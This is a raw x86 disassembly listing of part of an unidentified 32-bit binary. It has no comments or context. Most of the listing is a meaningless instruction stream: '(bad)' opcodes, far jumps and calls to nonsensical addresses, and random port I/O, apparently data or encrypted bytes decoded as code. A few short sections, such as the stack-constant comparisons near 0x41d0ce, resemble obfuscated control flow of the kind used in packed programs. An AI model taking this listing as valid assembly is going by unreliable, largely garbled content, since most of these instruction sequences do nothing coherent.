  41cffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cffd:	(bad)  
  41cffe:	call   0x4d4f:0x76a407eb
  41d005:	push   eax
  41d006:	push   edx
  41d007:	imul   edi,DWORD PTR [ebx-0x49],0xe958dc95
  41d00e:	xchg   BYTE PTR [edx-0xa79c60f],dl
  41d014:	push   edi
  41d015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d016:	push   ds
  41d017:	push   edx
  41d018:	and    DWORD PTR [ebp+0x2dff42b9],ebp
  41d01e:	jns    0x41d067
  41d020:	sub    BYTE PTR ss:[edx-0x278f30fc],bh
  41d027:	mov    ebx,0xf856c2c6
  41d02c:	cmc    
  41d02d:	aas    
  41d02e:	jle    0x41cfee
  41d030:	push   ss
  41d031:	(bad)  
  41d032:	xchg   ecx,eax
  41d033:	into   
  41d034:	jp     0x41d091
  41d036:	jmp    0x41d054
  41d038:	rcl    BYTE PTR [esi-0x1484fc52],0xd0
  41d03f:	sar    DWORD PTR [edi],cl
  41d041:	xchg   edx,eax
  41d042:	jne    0x41d05d
  41d044:	mov    bl,0x33
  41d046:	and    ah,BYTE PTR [ecx+0x71]
  41d049:	daa    
  41d04a:	ss call 0x2c767728
  41d050:	inc    ecx
  41d051:	mov    WORD PTR [eax],fs
  41d053:	ja     0x41d07b
  41d055:	scas   eax,DWORD PTR es:[edi]
  41d056:	sbb    eax,0x132189d
  41d05b:	pop    ss
  41d05c:	or     BYTE PTR [esi-0x24],bl
  41d05f:	out    0x4,al
  41d061:	lock pop edx
  41d063:	retf   
  41d064:	push   ss
  41d065:	pop    ss
  41d066:	jle    0x41d02c
  41d068:	push   ecx
  41d069:	jmp    0x6459e4e7
  41d06e:	xchg   ecx,eax
  41d06f:	out    dx,eax
  41d070:	and    ecx,eax
  41d072:	jae    0x41d022
  41d074:	xchg   ebp,eax
  41d075:	mov    BYTE PTR [edi-0x29624d87],bh
  41d07b:	pop    edi
  41d07c:	dec    esi
  41d07d:	sbb    eax,0x86dbb8a6
  41d082:	inc    ebx
  41d083:	loop   0x41d072
  41d085:	rcl    DWORD PTR [esi+0x66751b58],0x95
  41d08c:	stos   BYTE PTR es:[edi],al
  41d08d:	outs   dx,DWORD PTR ds:[esi]
  41d08e:	and    dl,BYTE PTR [edx+0x4f]
  41d091:	push   eax
  41d092:	imul   ecx,DWORD PTR [ebx+0x49],0x74
  41d096:	dec    ebp
  41d097:	test   BYTE PTR [ecx],ah
  41d099:	add    DWORD PTR [edi-0x71],0xffffffec
  41d09d:	mov    esp,0x3c17b83c
  41d0a2:	pusha  
  41d0a3:	push   eax
  41d0a4:	mov    ecx,0xf0c04755
  41d0a9:	in     al,0x65
  41d0ab:	xchg   esi,eax
  41d0ac:	add    eax,0x5754d683
  41d0b1:	jle    0x41d03c
  41d0b3:	mov    ebx,0xc4a2df99
  41d0b8:	loop   0x41d076
  41d0ba:	push   0x9924df79
  41d0bf:	int    0xe3
  41d0c1:	xor    bl,BYTE PTR [ebp-0x4a304406]
  41d0c7:	cmp    BYTE PTR [ebp+eiz*8-0x7c52e403],dl
  41d0ce:	sub    al,cl
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0xb3bc6585
  41d15f:	cmp    ebx,esp
  41d161:	stos   BYTE PTR es:[edi],al
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1+0x5d591818],bh
  41d16c:	inc    ebx
  41d16d:	sub    DWORD PTR [eax+0x58b16db7],edi
  41d173:	jle    0x41d1ca
  41d175:	test   BYTE PTR [ebx+edi*8+0x29],cl
  41d179:	inc    DWORD PTR [esi+eax*2-0x52]
  41d17d:	stc    
  41d17e:	inc    esp
  41d17f:	(bad)  
  41d180:	mov    al,0xb1
  41d182:	mov    eax,ds:0x3dfce271
  41d187:	jl     0x41d184
  41d189:	cmp    BYTE PTR [ebx],bl
  41d18b:	in     al,dx
  41d18c:	das    
  41d18d:	xchg   ebp,eax
  41d18e:	dec    ebx
  41d18f:	retf   
  41d190:	jmp    0x41d197
  41d192:	xlat   BYTE PTR ds:[ebx]
  41d193:	ud1    ecx,DWORD PTR ds:0x3f657be7
  41d19a:	and    BYTE PTR [edi-0x5],ch
  41d19d:	cmp    BYTE PTR [edi],bl
  41d19f:	and    eax,0x3fc78b14
  41d1a4:	xchg   edx,eax
  41d1a5:	int    0x2
  41d1a7:	ja     0x41d1c5
  41d1a9:	loopne 0x41d185
  41d1ab:	das    
  41d1ac:	xor    ebx,esp
  41d1ae:	rcr    DWORD PTR [ecx-0x394959c9],1
  41d1b4:	push   0x328a44b5
  41d1b9:	ins    BYTE PTR es:[edi],dx
  41d1ba:	cdq    
  41d1bb:	or     eax,0x3540da00
  41d1c0:	cmp    BYTE PTR [esi-0x565809ba],ch
  41d1c6:	pop    edi
  41d1c7:	dec    ebp
  41d1c8:	outs   dx,BYTE PTR ds:[esi]
  41d1c9:	push   ebp
  41d1ca:	push   esi
  41d1cb:	mov    ebp,0x86852887
  41d1d0:	outs   dx,BYTE PTR ds:[esi]
  41d1d1:	mov    dh,BYTE PTR [ebx]
  41d1d3:	sub    BYTE PTR [ebp-0x5],ch
  41d1d6:	mov    dl,0xa0
  41d1d8:	lahf   
  41d1d9:	push   esp
  41d1da:	loope  0x41d1f5
  41d1dc:	mov    edx,0x7cd38a1b
  41d1e1:	push   cs
  41d1e2:	fstp   QWORD PTR [edx]
  41d1e4:	sub    dh,BYTE PTR [esi+0x695ee415]
  41d1ea:	arpl   cx,dx
  41d1ec:	lods   al,BYTE PTR ds:[esi]
  41d1ed:	mov    edx,0xd0302afd
  41d1f2:	cmp    eax,0x8b1fa66a
  41d1f7:	div    ebp
  41d1f9:	aas    
  41d1fa:	repnz and al,0x6c
  41d1fd:	mov    al,0xf3
  41d1ff:	dec    ecx
  41d200:	dec    ecx
  41d201:	in     al,0x87
  41d203:	cmp    edx,DWORD PTR [ecx-0x3d1abedd]
  41d209:	das    
  41d20a:	fisttp DWORD PTR [eax]
  41d20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d20d:	ret    
  41d20e:	ins    BYTE PTR es:[edi],dx
  41d20f:	or     eax,DWORD PTR [eax+0x2a64fc8b]
  41d215:	add    BYTE PTR [eax-0x5b],ah
  41d218:	add    al,0x6b
  41d21a:	inc    ebp
  41d21b:	jp     0x41d25a
  41d21d:	ret    
  41d21e:	sub    al,0x61
  41d220:	jae    0x41d1c4
  41d222:	idiv   bh
  41d224:	lods   eax,DWORD PTR ds:[esi]
  41d225:	popf   
  41d226:	xor    eax,0x684ed0ce
  41d22b:	fsub   DWORD PTR [eax]
  41d22d:	in     al,dx
  41d22e:	or     al,ah
  41d230:	repnz dec edx
  41d232:	jb     0x41d24a
  41d234:	add    DWORD PTR [esi+0x6b],0x5ccac70b
  41d23b:	add    ebx,DWORD PTR [esi+0x38]
  41d23e:	pop    esi
  41d23f:	idiv   DWORD PTR cs:[ebx-0x4fa04684]
  41d246:	ins    DWORD PTR es:[edi],dx
  41d247:	and    DWORD PTR [esp+eax*8+0x66eca05],ebp
  41d24e:	mov    bl,0x67
  41d250:	in     eax,0xe2
  41d252:	fbld   TBYTE PTR [edx+0x59]
  41d255:	sbb    al,0x45
  41d257:	call   0x447b:0xb8068d2f
  41d25e:	int    0x4
  41d260:	(bad)  
  41d261:	push   cs
  41d262:	cmp    ch,BYTE PTR [ecx+0x797426fe]
  41d268:	repz mov ah,0x2
  41d26b:	add    dl,al
  41d26d:	dec    esi
  41d26e:	pop    eax
  41d26f:	dec    esp
  41d270:	test   DWORD PTR [si+0x432b],0xd1faa65a
  41d279:	push   esi
  41d27a:	sbb    al,0x92
  41d27c:	jl     0x41d262
  41d27e:	jmp    0x3705:0x2501d32a
  41d285:	mov    WORD PTR [edx+0x3d],?
  41d288:	jae    0x41d22d
  41d28a:	dec    ebp
  41d28b:	jbe    0x41d22e
  41d28d:	xlat   BYTE PTR ds:[ebx]
  41d28e:	inc    ebx
  41d28f:	push   ecx
  41d290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d291:	sub    eax,0xfde17084
  41d296:	retf   0xb583
  41d299:	daa    
  41d29a:	imul   ecx,esi,0x56
  41d29d:	test   BYTE PTR [ebx+0x6225732d],bh
  41d2a3:	add    dl,BYTE PTR [ebx-0x3e7b1dc4]
  41d2a9:	or     DWORD PTR [esi-0x65],ebp
  41d2ac:	push   ebp
  41d2ad:	mov    ebx,0x52c8190
  41d2b2:	test   BYTE PTR [edx-0x6147d41d],ch
  41d2b8:	pop    edx
  41d2b9:	call   0xd9856769
  41d2be:	mov    ch,0x20
  41d2c0:	test   eax,0xf752c4f8
  41d2c5:	int3   
  41d2c6:	inc    eax
  41d2c7:	mov    ds:0xac59c157,eax
  41d2cc:	inc    ebp
  41d2cd:	shl    bh,cl
  41d2cf:	xor    BYTE PTR ds:0x83c60207,dl
  41d2d5:	rcr    edi,0xf0
  41d2d8:	sub    esi,esp
  41d2da:	rcr    DWORD PTR [eax-0x2ba70d0d],0xff
  41d2e1:	sbb    al,0x12
  41d2e3:	inc    ebp
  41d2e4:	inc    esp
  41d2e5:	fsub   st(5),st
  41d2e7:	nop
  41d2e8:	mov    cl,0x71
  41d2ea:	mov    al,0xc5
  41d2ec:	data16 cmp BYTE PTR [eax-0x5f],ch
  41d2f0:	loopne 0x41d361
  41d2f2:	clc    
  41d2f3:	inc    edx
  41d2f4:	out    dx,al
  41d2f5:	jo     0x41d2c5
  41d2f7:	jp     0x41d339
  41d2f9:	data16 ss jns 0x41d35f
  41d2fd:	adc    al,0x26
  41d2ff:	inc    esp
  41d300:	dec    ebx
  41d301:	test   BYTE PTR [ebx+0x1d],cl
  41d304:	sti    
  41d305:	fnstenv [edi-0x77f2ae06]
  41d30b:	dec    eax
  41d30c:	adc    BYTE PTR ds:0xb2666902,dh
  41d312:	inc    ecx
  41d313:	daa    
  41d314:	and    dl,BYTE PTR [ebx]
  41d316:	jp     0x41d2e7
  41d318:	pop    ebx
  41d319:	outs   dx,DWORD PTR ds:[esi]
  41d31a:	jge    0x41d2df
  41d31c:	and    ebp,DWORD PTR [edi-0x223cdf6]
  41d322:	addr16 mov ch,0x6c
  41d325:	into   
  41d326:	sbb    ebp,ecx
  41d328:	push   0x5a
  41d32a:	inc    esp
  41d32b:	pop    ds
  41d32c:	inc    esi
  41d32d:	mov    al,ds:0xfd58d0bf
  41d332:	jno    0x41d3a6
  41d334:	das    
  41d335:	xor    BYTE PTR [ebx],0xc8
  41d338:	pusha  
  41d339:	in     eax,0xf2
  41d33b:	loop   0x41d318
  41d33d:	or     al,0x99
  41d33f:	xlat   BYTE PTR ds:[ebx]
  41d340:	imul   esi,DWORD PTR [edi],0x5b
  41d343:	ret    0xd7ee
  41d346:	xor    dl,cl
  41d348:	inc    ecx
  41d349:	lods   al,BYTE PTR ds:[esi]
  41d34a:	sub    BYTE PTR [eax-0x59b06ee9],ch
  41d350:	jmp    0x7a49:0x2ebabde2
  41d357:	add    ah,BYTE PTR [ebp+0x62159057]
  41d35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d35e:	mov    ebx,DWORD PTR [esp+edx*1+0x460ad271]
  41d365:	dec    esi
  41d366:	xor    bl,BYTE PTR [ecx-0x6a69ca5a]
  41d36c:	aas    
  41d36d:	push   0x6e
  41d36f:	aad    0xeb
  41d371:	lahf   
  41d372:	push   0x48
  41d374:	lds    ebx,FWORD PTR [edi+0x5f]
  41d377:	retf   0xf991
  41d37a:	sub    ebx,ebp
  41d37c:	ja     0x41d307
  41d37e:	call   0xe9cfe54c
  41d383:	or     bl,BYTE PTR ds:0x56d62294
  41d389:	sub    esp,DWORD PTR [edx-0x21]
  41d38c:	and    eax,0xb400a61d
  41d391:	cmp    cl,bh
  41d393:	(bad)  
  41d394:	adc    esi,esp
  41d396:	sub    eax,0xdfe12673
  41d39b:	pushf  
  41d39c:	jmp    0xa42b:0x8737501b
  41d3a3:	cmp    DWORD PTR [edx-0x64],ebp
  41d3a6:	push   ecx
  41d3a7:	test   DWORD PTR [ebp+0x12955a18],0xdd59668e
  41d3b1:	push   esp
  41d3b2:	shl    DWORD PTR [edx+0x2a],cl
  41d3b5:	mov    al,0x22
  41d3b7:	or     al,bh
  41d3b9:	xchg   DWORD PTR [edx-0x1f],ebx
  41d3bc:	dec    esp
  41d3bd:	into   
  41d3be:	or     al,0x47
  41d3c0:	mov    eax,0x46fc3aec
  41d3c5:	jo     0x41d3c3
  41d3c7:	sbb    al,0x3f
  41d3c9:	loop   0x41d3da
  41d3cb:	push   ebp
  41d3cc:	fild   DWORD PTR [esi-0x5]
  41d3cf:	sub    dh,0xb0
  41d3d2:	sub    BYTE PTR [edx],dl
  41d3d4:	in     al,dx
  41d3d5:	dec    ebp
  41d3d6:	fmul   DWORD PTR [esi-0x43]
  41d3d9:	add    ebx,DWORD PTR [ebx]
  41d3db:	dec    edx
  41d3dc:	out    0x64,al
  41d3de:	clc    
  41d3df:	dec    ebx
  41d3e0:	icebp  
  41d3e1:	and    BYTE PTR [eax],bl
  41d3e3:	scas   al,BYTE PTR es:[edi]
  41d3e4:	mov    esi,0x35de8b66
  41d3e9:	pop    ebx
  41d3eb:	xlat   BYTE PTR ds:[ebx]
  41d3ec:	or     DWORD PTR [eax],ebp
  41d3ee:	xchg   ebp,eax
  41d3ef:	push   ebp
  41d3f0:	es imul ebx,ecx,0x69
  41d3f4:	imul   ebp,ebp,0xa2d8112f
  41d3fa:	cld    
  41d3fb:	stos   DWORD PTR es:[edi],eax
  41d3fc:	push   edx
  41d3fd:	xchg   esi,eax
  41d3fe:	xchg   ecx,eax
  41d3ff:	push   es
  41d400:	cld    
  41d401:	push   esi
  41d402:	sub    ax,0x267f
  41d406:	dec    esi
  41d407:	sub    al,0x86
  41d409:	dec    esi
  41d40a:	xchg   esi,eax
  41d40b:	stos   DWORD PTR es:[edi],eax
  41d40c:	sub    ah,cl
  41d40e:	pop    ecx
  41d40f:	xchg   ecx,esi
  41d411:	inc    ecx
  41d412:	div    BYTE PTR [edi-0x149c12b8]
  41d418:	inc    ebp
  41d419:	pushf  
  41d41a:	and    ah,BYTE PTR [eax-0x2b1a0fe8]
  41d420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d421:	(bad)  
  41d422:	into   
  41d423:	retf   
  41d424:	dec    ecx
  41d425:	or     bh,al
  41d427:	fucomi st,st(2)
  41d429:	dec    ebx
  41d42a:	ins    DWORD PTR es:[edi],dx
  41d42b:	mov    dl,0xf7
  41d42d:	xchg   edi,eax
  41d42e:	xor    eax,0xead0ce31
  41d433:	jl     0x41d488
  41d435:	dec    esi
  41d436:	aas    
  41d437:	pop    ebx
  41d438:	inc    edi
  41d439:	mov    ch,0x3f
  41d43b:	or     BYTE PTR [ecx],al
  41d43d:	stos   DWORD PTR es:[edi],eax
  41d43e:	rol    DWORD PTR [ecx+0x3c],cl
  41d441:	call   0xfcf7:0x65fa9080
  41d448:	push   esi
  41d449:	rcl    bl,0xcf
  41d44c:	xchg   edi,eax
  41d44d:	add    BYTE PTR [esi+0x6d],bl
  41d450:	jo     0x41d3dd
  41d452:	adc    ebp,DWORD PTR [edx+0x53]
  41d455:	dec    edi
  41d456:	hlt    
  41d457:	out    dx,al
  41d458:	aad    0xb8
  41d45a:	or     BYTE PTR [edi],ah
  41d45c:	mov    ds:0xe209bd9,eax
  41d461:	xchg   DWORD PTR [eax+0x60],ecx
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	lods   al,BYTE PTR ds:[esi]
  41d466:	test   al,0x97
  41d468:	stos   BYTE PTR es:[edi],al
  41d469:	fldenv [eax-0x786b57f1]
  41d46f:	sub    bl,dl
  41d471:	xchg   ebp,eax
  41d472:	xor    BYTE PTR [esi+0x6cdadff4],al
  41d478:	nop
  41d479:	mov    ebp,0xf1a8aac
  41d47e:	into   
  41d47f:	fwait
  41d480:	add    ch,BYTE PTR [edx-0x7083f44a]
  41d486:	add    BYTE PTR [ebx+0x1e],dh
  41d489:	loopne 0x41d42f
  41d48b:	(bad)  
  41d48c:	xor    ecx,ecx
  41d48e:	(bad)  
  41d48f:	sti    
  41d490:	mov    ah,0x4e
  41d492:	jmp    0x2f8bc56a
  41d497:	leave  
  41d498:	xchg   ecx,eax
  41d499:	xor    ebp,DWORD PTR [eax-0x6d527378]
  41d49f:	mov    ecx,0xea1af7f8
  41d4a4:	jg     0x41d465
  41d4a6:	paddusb mm7,QWORD PTR [edi+0x8]
  41d4aa:	adc    dl,BYTE PTR [edi+edx*1]
  41d4ad:	popf   
  41d4ae:	and    eax,esp
  41d4b0:	repz jno 0x41d515
  41d4b3:	mov    ecx,0x7a65375a
  41d4b8:	add    DWORD PTR [esi+ecx*4],ebx
  41d4bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4bc:	xchg   ecx,eax
  41d4bd:	sub    bl,BYTE PTR [eax-0x28cb4647]
  41d4c3:	push   esp
  41d4c4:	mov    ebp,0x8bc2468d
  41d4c9:	lock int3 
  41d4cb:	imul   edi,DWORD PTR [ebx],0x883dc139
  41d4d1:	sahf   
  41d4d2:	push   edx
  41d4d3:	sub    DWORD PTR [edx],0x5276f550
  41d4d9:	fidivr DWORD PTR [ebx]
  41d4db:	out    0xda,eax
  41d4dd:	fwait
  41d4de:	lahf   
  41d4df:	cmp    al,0xb4
  41d4e1:	mov    DWORD PTR [ebp-0x1d5c7916],eax
  41d4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4e8:	lods   al,BYTE PTR ds:[esi]
  41d4e9:	push   ecx
  41d4ea:	mul    BYTE PTR [esi-0x1a]
  41d4ed:	shr    DWORD PTR [esi],1
  41d4ef:	sbb    edx,DWORD PTR [edx+0x4f]
  41d4f2:	jge    0x41d540
  41d4f4:	bound  edi,QWORD PTR [ebp-0xe]
  41d4f7:	adc    al,0x47
  41d4f9:	jge    0x41d56f
  41d4fb:	jge    0x41d4f7
  41d4fd:	or     BYTE PTR [edi+0x7a80038d],ch
  41d503:	push   ss
  41d504:	or     eax,0x71a19079
  41d509:	bound  esp,QWORD PTR [ecx-0xb]
  41d50c:	adc    DWORD PTR [eax+eax*1+0xe602998],ecx
  41d513:	jmp    0x77e5:0x91c143d4
  41d51a:	and    al,0x2c
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d577
  41d54b:	shl    DWORD PTR [edi],1
  41d54d:	push   0xffffffda
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1-0x1d0e7e8],bh
  41d558:	xchg   esp,eax
  41d559:	es shr esp,0x97
  41d55d:	in     eax,dx
  41d55e:	lock les ebp,FWORD PTR ss:[ecx-0x64d00332]
  41d566:	jmp    0x5de3ba8d
  41d56b:	xchg   ecx,eax
  41d56c:	fst    st(0)
  41d56e:	mov    ebx,0x7c4280d8
  41d573:	aaa    
  41d574:	(bad)  
  41d575:	fdivr  QWORD PTR [edi]
  41d577:	mov    edi,0xda3b0801
  41d57c:	cdq    
  41d57d:	mov    DWORD PTR [ebx+0x425a109e],esi
  41d583:	adc    cl,0x4f
  41d586:	adc    DWORD PTR [eax],0x79
  41d589:	(bad)  
  41d58a:	dec    ecx
  41d58b:	daa    
  41d58c:	ins    BYTE PTR es:[edi],dx
  41d58d:	fadd   DWORD PTR [edx]
  41d58f:	jg     0x41d514
  41d591:	sar    DWORD PTR [esi+0x6f],1
  41d594:	dec    ebx
  41d595:	(bad)  
  41d596:	add    esp,edi
  41d598:	out    0x65,al
  41d59a:	push   es
  41d59b:	ja     0x41d5de
  41d59d:	rcr    BYTE PTR [edx+0x51],1
  41d5a0:	cmp    eax,0xa4d650b8
  41d5a5:	mov    ah,0x6e
  41d5a7:	dec    ebx
  41d5a8:	inc    ebx
  41d5a9:	push   ebx
  41d5aa:	test   DWORD PTR ds:0x78d6ef78,edi
  41d5b0:	ins    DWORD PTR es:[edi],dx
  41d5b1:	push   edx
  41d5b2:	ds dec si
  41d5b5:	cmp    al,0x78
  41d5b7:	xor    dh,bl
  41d5b9:	mov    edi,gs
  41d5bb:	inc    edi
  41d5bc:	add    dl,0x79
  41d5bf:	jb     0x41d5a2
  41d5c1:	mov    cl,0x82
  41d5c3:	jno    0x41d5ba
  41d5c5:	repnz xchg esp,eax
  41d5c7:	jmp    0xb9d8:0x96a39303
  41d5ce:	imul   esi,DWORD PTR [edi-0x18],0x65
  41d5d2:	xor    esi,eax
  41d5d4:	add    BYTE PTR [esi],dh
  41d5d6:	or     ebx,DWORD PTR [ebp+0xc]
  41d5d9:	sbb    eax,0x9e6ba55e
  41d5de:	xchg   edi,eax
  41d5df:	jno    0x41d5bf
  41d5e1:	pusha  
  41d5e2:	inc    edx
  41d5e3:	ins    BYTE PTR es:[edi],dx
  41d5e4:	mov    ch,0x86
  41d5e6:	sub    al,0xcd
  41d5e8:	aam    0x3e
  41d5ea:	daa    
  41d5eb:	cmp    bh,dh
  41d5ed:	dec    ebx
  41d5ee:	out    dx,eax
  41d5ef:	dec    esp
  41d5f0:	les    edx,FWORD PTR [esi]
  41d5f2:	(bad)  
  41d5f3:	add    edi,eax
  41d5f5:	mov    ecx,0xf647b8ef
  41d5fa:	adc    DWORD PTR [edx+0x52ab9230],eax
  41d600:	lods   eax,DWORD PTR ds:[esi]
  41d601:	add    BYTE PTR [edi-0x10],al
  41d604:	ins    DWORD PTR es:[edi],dx
  41d605:	mov    ebp,0x7ccf2538
  41d60a:	pop    ebx
  41d60b:	(bad)  
  41d60c:	std    
  41d60d:	xchg   ebx,eax
  41d60e:	mov    eax,0xfbe54576
  41d613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d614:	dec    ebx
  41d615:	add    al,0xc1
  41d617:	jns    0x41d616
  41d619:	in     eax,dx
  41d61a:	(bad)  
  41d61b:	fisub  WORD PTR [ebp+0x6c]
  41d61e:	dec    eax
  41d61f:	cmp    BYTE PTR [edx+0x4b987ef5],dl
  41d625:	mov    WORD PTR [ebx+eax*4+0x3eec5a89],ss
  41d62c:	outs   dx,DWORD PTR ds:[esi]
  41d62d:	dec    ebx
  41d62e:	push   ebp
  41d62f:	and    bh,BYTE PTR [ebp*8+0x225b159f]
  41d636:	push   ecx
  41d637:	mul    DWORD PTR [edi-0x42]
  41d63a:	ins    BYTE PTR es:[edi],dx
  41d63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d63c:	into   
  41d63d:	push   ecx
  41d63e:	mov    bl,0x7c
  41d640:	stos   DWORD PTR es:[edi],eax
  41d641:	int3   
  41d642:	dec    esi
  41d643:	xor    al,0x4e
  41d645:	pop    ss
  41d646:	jbe    0x41d601
  41d648:	cmp    dh,0x49
  41d64b:	xor    ebp,DWORD PTR [ebx]
  41d64d:	sbb    eax,0xb530cf7e
  41d652:	or     ah,BYTE PTR [edi]
  41d654:	and    BYTE PTR [edx],dl
  41d656:	mov    al,0x2b
  41d658:	js     0x41d605
  41d65a:	fistp  DWORD PTR [ebx+0x41a8a3eb]
  41d660:	(bad)  
  41d662:	mov    al,bl
  41d664:	push   ecx
  41d665:	mov    dh,BYTE PTR [esi]
  41d667:	sti    
  41d668:	dec    edx
  41d669:	std    
  41d66a:	xchg   esi,eax
  41d66c:	leave  
  41d66d:	and    al,0x6f
  41d66f:	push   edi
  41d670:	xor    eax,DWORD PTR [eax+0x14]
  41d673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d674:	or     BYTE PTR [ecx-0x4fd52bcf],0x9b
  41d67b:	scas   eax,DWORD PTR es:[edi]
  41d67c:	dec    esi
  41d67d:	xor    ecx,eax
  41d67f:	jp     0x41d672
  41d681:	mov    bl,0xe8
  41d683:	js     0x41d653
  41d685:	jmp    0x4918dfcd
  41d68a:	das    
  41d68b:	add    ebp,DWORD PTR [esp+ebp*1+0x65a619c7]
  41d692:	call   0x502a:0x6a4e6d6e
  41d699:	push   0xffffff8e
  41d69b:	inc    eax
  41d69d:	mov    cs,WORD PTR [eax+ecx*8+0x3f]
  41d6a1:	fidivr DWORD PTR [edi-0x35db881b]
  41d6a7:	loope  0x41d709
  41d6a9:	xchg   ebx,eax
  41d6aa:	pop    eax
  41d6ab:	retf   
  41d6ac:	pop    ecx
  41d6ad:	lds    ecx,FWORD PTR [ebx]
  41d6af:	out    dx,al
  41d6b0:	or     ebp,esi
  41d6b2:	adc    eax,0x24439828
  41d6b7:	pop    ebx
  41d6b8:	xchg   esp,eax
  41d6b9:	loope  0x41d6b5
  41d6bb:	sar    BYTE PTR [esi],0xd9
  41d6be:	ret    
  41d6bf:	pop    esi
  41d6c0:	mov    fs,WORD PTR [eax+0x2f3b8516]
  41d6c6:	add    eax,0x2283ab35
  41d6cb:	and    al,0xad
  41d6cd:	inc    ebx
  41d6ce:	fisttp WORD PTR [edi]
  41d6d0:	or     cl,al
  41d6d2:	clc    
  41d6d3:	into   
  41d6d4:	das    
  41d6d5:	int3   
  41d6d6:	ins    BYTE PTR es:[edi],dx
  41d6d7:	repz inc esi
  41d6d9:	out    dx,al
  41d6da:	cmp    al,0x1a
  41d6dc:	shr    DWORD PTR [ebx],0x68
  41d6df:	cli    
  41d6e0:	mov    ecx,0x79a49510
  41d6e5:	add    al,0xa6
  41d6e7:	je     0x41d6c4
  41d6e9:	icebp  
  41d6ea:	mov    esp,0x231f6075
  41d6ef:	int3   
  41d6f0:	mov    dl,0x4c
  41d6f2:	mov    bh,BYTE PTR [eax-0x3a615aa5]
  41d6f8:	mov    esi,0x57581c93
  41d6fd:	and    cl,BYTE PTR ds:0x24464fb6
  41d703:	jge    0x41d6bd
  41d705:	ss inc ebp
  41d707:	es es inc esi
  41d70a:	adc    al,0x3e
  41d70c:	fidivr DWORD PTR [esi]
  41d70e:	pop    ss
  41d70f:	push   ecx
  41d710:	mov    esp,0x564b2019
  41d715:	sbb    DWORD PTR [ebp-0x7f],ebp
  41d718:	jmp    0x41d77b
  41d71a:	out    0x83,eax
  41d71c:	pop    edi
  41d71d:	cmp    cl,BYTE PTR [ebx]
  41d71f:	pop    esi
  41d720:	jbe    0x41d6c5
  41d722:	or     BYTE PTR [ebx-0x265aed1f],dl
  41d728:	mov    bl,0x85
  41d72a:	mov    bl,0xaf
  41d72c:	jmp    0x391f:0x4224038b
  41d733:	rol    ecx,0x5e
  41d736:	adc    BYTE PTR [edi+eiz*8],bl
  41d739:	mov    bh,0xc3
  41d73b:	in     al,dx
  41d73c:	out    0x5b,al
  41d73e:	call   0xb362:0xb40fbc52
  41d745:	push   esi
  41d746:	xchg   edx,eax
  41d747:	xchg   edx,eax
  41d748:	fstp   TBYTE PTR [edi+0x4c]
  41d74b:	stc    
  41d74c:	lods   al,BYTE PTR ds:[esi]
  41d74d:	in     eax,dx
  41d74e:	(bad)  
  41d74f:	sub    ah,BYTE PTR [ebx]
  41d751:	popf   
  41d752:	cwde   
  41d753:	jae    0x41d77e
  41d755:	mov    ss,WORD PTR [edx]
  41d757:	sar    BYTE PTR [edx-0x3f],0x70
  41d75b:	mov    ebx,0xc274ebe3
  41d760:	(bad)  
  41d761:	mov    esp,0x7cf02305
  41d766:	cmp    DWORD PTR [edx-0x10827dcd],ebx
  41d76c:	inc    edx
  41d76d:	pop    esi
  41d76e:	push   0xcdd388ab
  41d773:	repnz and al,0x35
  41d776:	ins    DWORD PTR es:[edi],dx
  41d777:	or     cl,bh
